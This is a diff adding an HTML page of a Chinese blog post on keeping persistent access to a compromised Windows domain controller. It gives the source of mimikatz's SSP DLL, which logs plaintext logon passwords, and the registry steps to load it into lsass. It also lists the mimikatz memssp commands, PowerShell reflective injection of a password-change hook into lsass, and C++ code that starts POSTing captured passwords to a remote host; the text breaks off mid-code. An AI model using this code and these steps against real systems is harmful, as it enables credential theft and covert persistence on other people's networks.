@@ -1,0 +1,519 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/kd.png">
+  <link rel="icon" href="/img/kd.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>域渗透之域控权限维持 - SD</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"sd-xd.github.io","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>blog of SD</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="域渗透之域控权限维持">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-08-30 19:47" pubdate>
+        2021年8月30日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.7k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      24
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">域渗透之域控权限维持</h1>
+            
+            <div class="markdown-body">
+              <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>拿下域控,渗透就结束了吗?实际上,往往刚刚开始。<br>本文就域控权限维持的两种方法展开研究:<code>SSP</code>和<code>PasswordChangeNotify</code>。</p>
+<h2 id="SSP"><a href="#SSP" class="headerlink" title="SSP"></a>SSP</h2><h3 id="何为SSP"><a href="#何为SSP" class="headerlink" title="何为SSP"></a>何为SSP</h3><p>SPP全称为<code>Security Support Provider</code>,安全支持提供者。<br>SPP是一个dll,用于身份的验证。<br>windows下的SSP包含有:</p>
+<ul>
+<li>NTLMSSP (msv1_0.dll)</li>
+<li>Kerberos (kerberos.dll)</li>
+<li>NegotiateSSP (secur32.dll)</li>
+<li>Secure Channel (schannel.dll)</li>
+<li>TLS/SSL</li>
+<li>Digest SSP (wdigest.dll)</li>
+<li>CredSSP (credssp.dll)</li>
+<li>DPA(Distributed Password Authentication) (msapsspc.dll)</li>
+<li>Public Key Cryptography User-to-User (PKU2U, pku2u.dll)</li>
+</ul>
+<h3 id="SSPI"><a href="#SSPI" class="headerlink" title="SSPI"></a>SSPI</h3><p>SSPI全称为<code>Security Support Provider Interface</code>,为SSP接口,实际上就是SSP的API。</p>
+<h3 id="LSA"><a href="#LSA" class="headerlink" title="LSA"></a>LSA</h3><p>LSA全称<code>Local Security Authority</code>,是微软窗口操作系统的一个内部程序，负责运行Windows系统安全政策。它在用户登录时电脑单机或服务器时，验证用户身份，管理用户密码变更，并产生访问字符。它也会在窗口安全记录档中留下应有的记录。用于身份的验证。其中就包含有<code>lsass.exe</code>进程。<br><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/1.png" srcset="/img/loading.gif" lazyload><br>操作lsass进程需要至少system权限。</p>
+<h3 id="利用SSP进行权限维持"><a href="#利用SSP进行权限维持" class="headerlink" title="利用SSP进行权限维持"></a>利用SSP进行权限维持</h3><p>如果获得目标系统system权限，可以使用该方法进行持久化操作。其主要原理是：LSA（Local Security Authority）用于身份验证；lsass.exe作为windows的系统进程，用于本地安全和登录策略；在系统启动时，SSP将被加载到lsass.exe 进程中。但是，假如攻击者对LSA进行了扩展，自定义了恶意的DLL文件，在系统启动时将其加载到lsass.exe进程中，就能够获取lsass.exe进程中的明文密码。这样即使用户更改密码并重新登录，攻击者依然可以获得该账号的新密码。</p>
+<p><code>mimikatz</code>早以支持这个功能,该文件为为<code>mimilib.dll</code>。mimikatz poc为:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kssp.h&quot;</span></span><br><br><span class="hljs-keyword">static</span> SECPKG_FUNCTION_TABLE kiwissp_SecPkgFunctionTable = &#123;<br>	<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>,<br>	kssp_SpInitialize, kssp_SpShutDown, kssp_SpGetInfo, kssp_SpAcceptCredentials,<br>	<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>,<br>	<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>,<br>	<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>,<br>&#125;;<br><br><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">kssp_SpInitialize</span><span class="hljs-params">(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br><br><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">kssp_SpShutDown</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br><br><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">kssp_SpGetInfo</span><span class="hljs-params">(PSecPkgInfoW PackageInfo)</span></span><br><span class="hljs-function"></span>&#123;<br>	PackageInfo-&gt;fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;<br>	PackageInfo-&gt;wVersion   = <span class="hljs-number">1</span>;<br>	PackageInfo-&gt;wRPCID     = SECPKG_ID_NONE;<br>	PackageInfo-&gt;cbMaxToken = <span class="hljs-number">0</span>;<br>	PackageInfo-&gt;Name       = <span class="hljs-string">L&quot;KiwiSSP&quot;</span>;<br>	PackageInfo-&gt;Comment    = <span class="hljs-string">L&quot;Kiwi Security Support Provider&quot;</span>;<br>	<span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br><br><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">kssp_SpAcceptCredentials</span><span class="hljs-params">(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)</span></span><br><span class="hljs-function"></span>&#123;<br>	FILE * kssp_logfile;;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> <span class="hljs-meta-keyword">warning</span>(push)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> <span class="hljs-meta-keyword">warning</span>(disable:4996)</span><br>	<span class="hljs-keyword">if</span>(kssp_logfile = _wfopen(<span class="hljs-string">L&quot;kiwissp.log&quot;</span>, <span class="hljs-string">L&quot;a&quot;</span>))<br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> <span class="hljs-meta-keyword">warning</span>(pop)</span><br>	&#123;	<br>		<span class="hljs-built_in">klog</span>(kssp_logfile, <span class="hljs-string">L&quot;[%08x:%08x] [%08x] %wZ\\%wZ (%wZ)\t&quot;</span>, PrimaryCredentials-&gt;LogonId.HighPart, PrimaryCredentials-&gt;LogonId.LowPart, LogonType, &amp;PrimaryCredentials-&gt;DomainName, &amp;PrimaryCredentials-&gt;DownlevelName, AccountName);<br>		<span class="hljs-built_in">klog_password</span>(kssp_logfile, &amp;PrimaryCredentials-&gt;Password);<br>		<span class="hljs-built_in">klog</span>(kssp_logfile, <span class="hljs-string">L&quot;\n&quot;</span>);<br>		<span class="hljs-built_in">fclose</span>(kssp_logfile);<br>	&#125;<br>	<span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br><br><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">kssp_SpLsaModeInitialize</span><span class="hljs-params">(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables)</span></span><br><span class="hljs-function"></span>&#123;<br>	*PackageVersion = <span class="hljs-number">0x00000042</span>;<br>	*ppTables = &amp;kiwissp_SecPkgFunctionTable;<br>	*pcTables = <span class="hljs-number">1</span>;<br>	<span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>64位和32位的都有,和目标系统位数要一致。<br>将该dll拷贝到域控<code>c:\windows\system32</code>下<br><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>打开注册表,修改域控位置<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages\</code><br><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>在<code>Security Packages</code>下添加<code>mimilib.dll</code><br><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/5.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>将域控重启系统。打开新生成文件<code>c:\windows\system32\kiwissp.log</code>。<br><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/7.png" srcset="/img/loading.gif" lazyload></p>
+<p>kiwissp.log记录着登录的账户和明文密码<br><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/8.png" srcset="/img/loading.gif" lazyload></p>
+<p>但该方式弊端非常明显:重启的动作太大。<br>mimikatz同样支持了以内存更新的方式更新ssp,无需重启就能获取到登录用户的账号信息和密码。</p>
+<p>进入与目标系统位数相同的mimikatz后,输入命令</p>
+<ul>
+<li>privilege::debug</li>
+<li>misc::memssp</li>
+</ul>
+<p><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/9.png" srcset="/img/loading.gif" lazyload></p>
+<p>当目标用户注销后再登录,账户和明文密码会储存到<code>C:\Windows\system32\mimilsa.log</code><br><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/10.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">type C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\m</span>imilsa.log<br></code></pre></td></tr></table></figure>
+<p><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/11.png" srcset="/img/loading.gif" lazyload></p>
+<p>实际上就是将该dll注入到lsass进程中。该方式重启后无效,需要重新注入。<br>但依靠mimikatz这两种方式有一定局限性。下面介绍通过<code>Hook PasswordChangeNotify</code>拦截修改的帐户密码的方法。</p>
+<h2 id="PasswordChangeNotify"><a href="#PasswordChangeNotify" class="headerlink" title="PasswordChangeNotify"></a>PasswordChangeNotify</h2><h3 id="何为PasswordChangeNotify"><a href="#何为PasswordChangeNotify" class="headerlink" title="何为PasswordChangeNotify"></a>何为PasswordChangeNotify</h3><p><code>PasswordChangeNotify</code>是windows提供的一个API。<br>具体参数返回值参照官方文档:<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nc-ntsecapi-psam_password_notification_routine">https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nc-ntsecapi-psam_password_notification_routine</a><br>当域控密码被修改时,LSA首先调用<code>PasswordFileter</code>函数,该函数作用为检测新密码是否满足复杂度。如果符合则调用<code>PasswordChangeNotify</code>在系统上同步更新密码。</p>
+<h3 id="HOOK-PasswordChangeNotify"><a href="#HOOK-PasswordChangeNotify" class="headerlink" title="HOOK PasswordChangeNotify"></a>HOOK PasswordChangeNotify</h3><p>具体实现思路如下:</p>
+<ol>
+<li>为PasswordChangeNotify创建一个钩子,将函数执行流重定向到我们自己的PasswordChangeNotifyHook函数中。</li>
+<li>在PasswordChangeNotifyHook函数中写入获取密码的代码,然后再取消钩子,重新将执行流还给PasswordChangeNotify。</li>
+<li>将生成的dll注入到lssas进程中。<br>使用HOOK PasswordChangeNotify无需重启域控系统或修改注册表,更加隐蔽且贴合实际。</li>
+</ol>
+<h3 id="技术复现"><a href="#技术复现" class="headerlink" title="技术复现"></a>技术复现</h3><p>前人栽树,后人乘凉。<br>项目地址:<a target="_blank" rel="noopener" href="https://github.com/clymb3r/Misc-Windows-Hacking">https://github.com/clymb3r/Misc-Windows-Hacking</a></p>
+<p>下载后将sln文件打开,右键解决方案,将MFC的使用设置为在静态库中使用MFC编译工程,然后F7编译。<br><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/12.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/13.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="dll生成成功之后就需要将dll注入-这里估摸着自己写一个远线程注入也可以-同样可以使用powershell脚本进行注入。"><a href="#dll生成成功之后就需要将dll注入-这里估摸着自己写一个远线程注入也可以-同样可以使用powershell脚本进行注入。" class="headerlink" title="dll生成成功之后就需要将dll注入,这里估摸着自己写一个远线程注入也可以,同样可以使用powershell脚本进行注入。"></a>dll生成成功之后就需要将dll注入,这里估摸着自己写一个远线程注入也可以,同样可以使用powershell脚本进行注入。</h2><h2 id="https-github-com-clymb3r-PowerShell-blob-master-Invoke-ReflectivePEInjection-Invoke-ReflectivePEInjection-ps1"><a href="#https-github-com-clymb3r-PowerShell-blob-master-Invoke-ReflectivePEInjection-Invoke-ReflectivePEInjection-ps1" class="headerlink" title="https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1"></a><a target="_blank" rel="noopener" href="https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1">https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1</a></h2><p>使用该将HookPasswordChange.dll注入内存</p>
+<blockquote>
+<p>Set-ExecutionPolicy bypass<br>Import-Module .\Invoke-ReflectivePEInjection.ps1<br>Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass</p>
+</blockquote>
+<p>执行后若无报错信息则说明注入成功。注意dll位数。<br><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/14.png" srcset="/img/loading.gif" lazyload></p>
+<p>当更改密码后,能够抓取到更改后的密码,账户和明文密码储存在<code>C:\Windows\Temp\passwords.txt</code>。<br><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/15.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/16.png" srcset="/img/loading.gif" lazyload></p>
+<p>当然存储文件位置和类型可以自定义,只需更改HookPasswordChange.cpp文件。<br><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/17.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果觉得仍然不方便,希望直接将密码上传到服务器,可以使用http协议发送。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;WinInet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ntsecapi.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">writeToLog</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* szString)</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE* pFile = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;c:\\windows\\temp\\logFile.txt&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == pFile)<br>    &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">fprintf</span>(pFile, <span class="hljs-string">&quot;%s\r\n&quot;</span>, szString);<br>    <span class="hljs-built_in">fclose</span>(pFile);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><br><br><span class="hljs-comment">// Default DllMain implementation</span><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HANDLE hModule, </span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call, </span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">OutputDebugString</span>(<span class="hljs-string">L&quot;DllMain&quot;</span>);<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (ul_reason_for_call)<br>    &#123;<br>        <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>        <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>        <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function">BOOLEAN __stdcall <span class="hljs-title">InitializeChangeNotify</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">OutputDebugString</span>(<span class="hljs-string">L&quot;InitializeChangeNotify&quot;</span>);<br>    <span class="hljs-built_in">writeToLog</span>(<span class="hljs-string">&quot;InitializeChangeNotify()&quot;</span>);<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function">BOOLEAN __stdcall <span class="hljs-title">PasswordFilter</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    PUNICODE_STRING AccountName,</span></span><br><span class="hljs-params"><span class="hljs-function">    PUNICODE_STRING FullName,</span></span><br><span class="hljs-params"><span class="hljs-function">    PUNICODE_STRING Password,</span></span><br><span class="hljs-params"><span class="hljs-function">    BOOLEAN SetOperation )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">OutputDebugString</span>(<span class="hljs-string">L&quot;PasswordFilter&quot;</span>);<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function">NTSTATUS __stdcall <span class="hljs-title">PasswordChangeNotify</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    PUNICODE_STRING UserName,</span></span><br><span class="hljs-params"><span class="hljs-function">    ULONG RelativeId,</span></span><br><span class="hljs-params"><span class="hljs-function">    PUNICODE_STRING NewPassword )</span></span><br><span class="hljs-function"></span>&#123;<br>  FILE* pFile = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;c:\\windows\\temp\\logFile.txt&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>);<br>  <span class="hljs-comment">//HINTERNET hInternet = InternetOpen(L&quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0&quot;,INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);</span><br>	HINTERNET hInternet = <span class="hljs-built_in">InternetOpen</span>(<span class="hljs-string">L&quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0&quot;</span>,INTERNET_OPEN_TYPE_DIRECT,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>);<br>	HINTERNET hSession = <span class="hljs-built_in">InternetConnect</span>(hInternet,<span class="hljs-string">L&quot;192.168.1.1&quot;</span>,<span class="hljs-number">80</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,INTERNET_SERVICE_HTTP ,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>	HINTERNET hReq = <span class="hljs-built_in">HttpOpenRequest</span>(hSession,<span class="hljs-string">L&quot;POST&quot;</span>,<span class="hljs-string">L&quot;/&quot;</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>	<span class="hljs-keyword">char</span>* pBuf=<span 